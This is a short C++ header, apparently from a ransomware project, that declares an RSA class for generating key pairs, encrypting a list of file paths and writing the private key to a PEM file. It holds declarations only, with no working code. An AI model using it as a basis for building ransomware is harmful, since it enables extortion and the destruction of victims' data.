//
// Created on 22.01.20.
//

#ifndef RANSOMWARE_RSA_ALGO_H
#define RANSOMWARE_RSA_ALGO_H

#include <boost/filesystem/path.hpp>
#include <iostream>
#include <openssl/rsa.h>


#include "algorithm.h"

class RSAAlgorithm : public Algorithm {

private:
    std::vector<boost::filesystem::path> _files;
    char *_privateKey;
    char *_publicKey;
    static RSA *_keypair;

    bool generateKeyPair();

public:
    RSAAlgorithm();
    ~RSAAlgorithm();

    void encrypt(std::vector<boost::filesystem::path>&);
    void decrypt();

    void createPrivateKey(bool file);
    void createPublicKey(bool file);

    char* getPrivateKey();
    char* getPublicKey();

    void writePrivateKeyToPEMFile();
};


#endif //RANSOMWARE_RSA_ALGO_H
